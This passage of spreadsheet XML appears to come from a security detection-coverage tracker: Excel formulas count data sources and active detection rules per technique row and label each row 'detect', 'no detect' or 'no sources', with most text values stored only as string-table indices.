        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P235" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S23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35" t="s">
        <v>686</v>
      </c>
      <c r="U235" t="s">
        <v>1292</v>
      </c>
      <c r="V235" t="s">
        <v>1293</v>
      </c>
      <c r="W235" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="236" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A236" t="s">
        <v>1294</v>
      </c>
      <c r="B236" t="s">
        <v>1294</v>
      </c>
      <c r="C236" t="s">
        <v>104</v>
      </c>
      <c r="D236" t="s">
        <v>2</v>
      </c>
      <c r="E236" t="s">
        <v>1295</v>
      </c>
      <c r="F236" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G236" s="9" cm="1">
        <f t="array" ref="G236">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H236" s="9" cm="1">
        <f t="array" ref="H236">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I236" s="9" t="str" cm="1">
        <f t="array" ref="I236">IF(SUM(IF($C236=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C236=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J236" s="9" cm="1">
        <f t="array" ref="J23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236" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M236" s="9" cm="1">
        <f t="array" ref="M236">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N236" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O236" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P236" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S23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36" t="s">
        <v>368</v>
      </c>
      <c r="U236" t="s">
        <v>1296</v>
      </c>
      <c r="V236" t="s">
        <v>1297</v>
      </c>
      <c r="W236" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="237" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A237" t="s">
        <v>1294</v>
      </c>
      <c r="B237" t="s">
        <v>1298</v>
      </c>
      <c r="C237" t="s">
        <v>341</v>
      </c>
      <c r="D237" t="s">
        <v>2</v>
      </c>
      <c r="E237" t="s">
        <v>531</v>
      </c>
      <c r="F237" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G237" s="9" cm="1">
        <f t="array" ref="G237">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H237" s="9" t="str" cm="1">
        <f t="array" ref="H237">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I237" s="9" t="str" cm="1">
        <f t="array" ref="I237">IF(SUM(IF($C237=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C237=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J237" s="9" t="str" cm="1">
        <f t="array" ref="J23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37" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M237" s="9" cm="1">
        <f t="array" ref="M237">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N237" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O237" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P237" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S23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37" t="s">
        <v>368</v>
      </c>
      <c r="U237" t="s">
        <v>1299</v>
      </c>
      <c r="V237" t="s">
        <v>1300</v>
      </c>
      <c r="W237" t="b">
        <v>1</v>
      </c>
      <c r="X237" t="s">
        <v>1294</v>
      </c>
    </row>
    <row r="238" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A238" t="s">
        <v>1294</v>
      </c>
      <c r="B238" t="s">
        <v>1301</v>
      </c>
      <c r="C238" t="s">
        <v>340</v>
      </c>
      <c r="D238" t="s">
        <v>2</v>
      </c>
      <c r="E238" t="s">
        <v>531</v>
      </c>
      <c r="F238" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G238" s="9" cm="1">
        <f t="array" ref="G238">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H238" s="9" t="str" cm="1">
        <f t="array" ref="H238">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I238" s="9" t="str" cm="1">
        <f t="array" ref="I238">IF(SUM(IF($C238=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C238=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J238" s="9" t="str" cm="1">
        <f t="array" ref="J23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38" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M238" s="9" cm="1">
        <f t="array" ref="M238">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N238" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O238" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P238" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S23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38" t="s">
        <v>368</v>
      </c>
      <c r="U238" t="s">
        <v>1302</v>
      </c>
      <c r="V238" t="s">
        <v>1300</v>
      </c>
      <c r="W238" t="b">
        <v>1</v>
      </c>
      <c r="X238" t="s">
        <v>1294</v>
      </c>
    </row>
    <row r="239" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A239" t="s">
        <v>1294</v>
      </c>
      <c r="B239" t="s">
        <v>1303</v>
      </c>
      <c r="C239" t="s">
        <v>289</v>
      </c>
      <c r="D239" t="s">
        <v>2</v>
      </c>
      <c r="E239" t="s">
        <v>1304</v>
      </c>
      <c r="F239" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G239" s="9" cm="1">
        <f t="array" ref="G239">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H239" s="9" t="str" cm="1">
        <f t="array" ref="H239">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I239" s="9" t="str" cm="1">
        <f t="array" ref="I239">IF(SUM(IF($C239=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C239=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J239" s="9" t="str" cm="1">
        <f t="array" ref="J23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39" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M239" s="9" cm="1">
        <f t="array" ref="M239">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N239" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O239" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P239" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S23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39" t="s">
        <v>368</v>
      </c>
      <c r="U239" t="s">
        <v>1305</v>
      </c>
      <c r="V239" t="s">
        <v>1306</v>
      </c>
      <c r="W239" t="b">
        <v>1</v>
      </c>
      <c r="X239" t="s">
        <v>1294</v>
      </c>
    </row>
    <row r="240" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A240" t="s">
        <v>1307</v>
      </c>
      <c r="B240" t="s">
        <v>1307</v>
      </c>
      <c r="C240" t="s">
        <v>30</v>
      </c>
      <c r="D240" t="s">
        <v>1308</v>
      </c>
      <c r="E240" t="s">
        <v>1309</v>
      </c>
      <c r="F240" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G240" s="9" cm="1">
        <f t="array" ref="G240">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H240" s="9" cm="1">
        <f t="array" ref="H240">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I240" s="9" t="str" cm="1">
        <f t="array" ref="I240">IF(SUM(IF($C240=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C240=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J240" s="9" t="str" cm="1">
        <f t="array" ref="J24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40" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M240" s="9" cm="1">
        <f t="array" ref="M240">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N240" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O240" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P240" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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40" t="s">
        <v>386</v>
      </c>
      <c r="U240" t="s">
        <v>1310</v>
      </c>
      <c r="V240" t="s">
        <v>1311</v>
      </c>
      <c r="W240" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="241" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A241" t="s">
        <v>1312</v>
      </c>
      <c r="B241" t="s">
        <v>1312</v>
      </c>
      <c r="C241" t="s">
        <v>116</v>
      </c>
      <c r="D241" t="s">
        <v>2</v>
      </c>
      <c r="E241" t="s">
        <v>1313</v>
      </c>
      <c r="F241" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G241" s="9" cm="1">
        <f t="array" ref="G241">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H241" s="9" cm="1">
        <f t="array" ref="H241">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I241" s="9" t="str" cm="1">
        <f t="array" ref="I241">IF(SUM(IF($C241=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C241=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J241" s="9" t="str" cm="1">
        <f t="array" ref="J24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41" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M241" s="9" cm="1">
        <f t="array" ref="M241">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N241" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O241" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P241" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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41" t="s">
        <v>1010</v>
      </c>
      <c r="U241" t="s">
        <v>1314</v>
      </c>
      <c r="V241" t="s">
        <v>1315</v>
      </c>
      <c r="W241" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="242" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A242" t="s">
        <v>1316</v>
      </c>
      <c r="B242" t="s">
        <v>1316</v>
      </c>
      <c r="C242" t="s">
        <v>65</v>
      </c>
      <c r="D242" t="s">
        <v>2</v>
      </c>
      <c r="E242" t="s">
        <v>1317</v>
      </c>
      <c r="F242" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G242" s="9" cm="1">
        <f t="array" ref="G242">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H242" s="9" cm="1">
        <f t="array" ref="H242">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I242" s="9" t="str" cm="1">
        <f t="array" ref="I242">IF(SUM(IF($C242=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C242=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J242" s="9" t="str" cm="1">
        <f t="array" ref="J24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42" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M242" s="9" cm="1">
        <f t="array" ref="M242">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N242" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O242" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P242" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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42" t="s">
        <v>368</v>
      </c>
      <c r="U242" t="s">
        <v>1318</v>
      </c>
      <c r="V242" t="s">
        <v>1319</v>
      </c>
      <c r="W242" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="243" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A243" t="s">
        <v>1320</v>
      </c>
      <c r="B243" t="s">
        <v>1320</v>
      </c>
      <c r="C243" t="s">
        <v>182</v>
      </c>
      <c r="D243" t="s">
        <v>8</v>
      </c>
      <c r="E243" t="s">
        <v>1321</v>
      </c>
      <c r="F243" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G243" s="9" cm="1">
        <f t="array" ref="G243">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H243" s="9" cm="1">
        <f t="array" ref="H243">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I243" s="9" t="str" cm="1">
        <f t="array" ref="I243">IF(SUM(IF($C243=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C243=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J243" s="9" t="str" cm="1">
        <f t="array" ref="J24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43" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M243" s="9" cm="1">
        <f t="array" ref="M243">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N243" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O243" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P243" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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43" t="s">
        <v>1322</v>
      </c>
      <c r="U243" t="s">
        <v>1323</v>
      </c>
      <c r="V243" t="s">
        <v>1324</v>
      </c>
      <c r="W243" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="244" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A244" t="s">
        <v>1325</v>
      </c>
      <c r="B244" t="s">
        <v>1325</v>
      </c>
      <c r="C244" t="s">
        <v>181</v>
      </c>
      <c r="D244" t="s">
        <v>6</v>
      </c>
      <c r="E244" t="s">
        <v>463</v>
      </c>
      <c r="F244" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G244" s="9" cm="1">
        <f t="array" ref="G244">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H244" s="9" cm="1">
        <f t="array" ref="H244">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I244" s="9" t="str" cm="1">
        <f t="array" ref="I244">IF(SUM(IF($C244=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C244=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J244" s="9" t="str" cm="1">
        <f t="array" ref="J24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44" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M244" s="9" cm="1">
        <f t="array" ref="M244">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N244" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O244" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P244" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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44" t="s">
        <v>386</v>
      </c>
      <c r="U244" t="s">
        <v>1326</v>
      </c>
      <c r="V244" t="s">
        <v>1327</v>
      </c>
      <c r="W244" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="245" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A245" t="s">
        <v>1328</v>
      </c>
      <c r="B245" t="s">
        <v>1328</v>
      </c>
      <c r="C245" t="s">
        <v>66</v>
      </c>
      <c r="D245" t="s">
        <v>3</v>
      </c>
      <c r="E245" t="s">
        <v>1329</v>
      </c>
      <c r="F245" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G245" s="9" cm="1">
        <f t="array" ref="G245">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
